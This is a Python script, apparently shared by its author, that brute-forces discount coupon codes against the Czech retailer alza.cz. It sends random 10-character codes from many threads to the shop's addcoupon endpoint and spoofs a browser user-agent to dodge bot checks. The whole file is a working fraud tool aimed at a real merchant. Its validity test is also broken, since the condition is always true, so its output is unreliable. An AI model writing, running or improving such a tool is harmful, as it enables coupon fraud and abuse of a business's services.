import os
import requests
from threading import Thread
import string
import random
from colorama import Fore
import time

## alza.cz COUPON CHECKER
## 10 random digits and UC characters
##ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 - 37!

attempts = 0
hits = 0
cpm = 0
# To prevent bot verification
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36"
}
class Spammer(Thread):
	def __init__(self):
		Thread.__init__(self)
	def run(self):
            while True:
                try:
                    #generate the coupons (won't bother with saving tested coupons)
                    CODE = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    r = requests.get(f'https://www.alza.cz/services/restservice.svc/v1/addcoupon/{CODE}', headers=headers)
                    if "není platný" or "<" in r.text:
                        global attempts
                        global hits
                        attempts += 1
                        print(f'{Fore.RED}[-]{Fore.RESET} Invalid coupon: {CODE} {Fore.YELLOW}[{attempts}]{Fore.RESET}')
                        os.system(f'title Checked: {attempts} Hits: {hits} CPM: {cpm}')
                        continue
                    else:
                        attempts += 1
                        hits += 1
                        print(f'{Fore.GREEN}[!!!] VALID COUPON: {CODE}{Fore.RESET}')
                        os.system(f'title Checked: {attempts} Hits: {hits} CPM: {cpm}')
                        f = open('hits.txt', 'a')
                        f.write(f'{CODE} ')
                        f.close()
                except :
                    print('error')
                    continue
def main():
	threads = []
	threads_n = int(input('[?] Threads: '))
	for i in range(threads_n):
		new_spammer = Spammer()
		new_spammer.start()
		threads.append(new_spammer)
def cpm():
            global cpm
            while True:
                oldchecked = attempts
                time.sleep(1)
                newchecked = attempts
                cpm = (newchecked - oldchecked) * 60
Thread(target=cpm).start()
print("""
       _                    
      | |                   
  __ _| |______ _   ___ ____
 / _` | |_  / _` | / __|_  /
| (_| | |/ / (_| || (__ / / 
 \__,_|_/___\__,_(_)___/___|
    coupon generator and checker
    proxyless, high CPM (3000+)
                            """)
os.system('title Alza.cz coupon checker by Exzed#1817')

if __name__ == '__main__':
    main()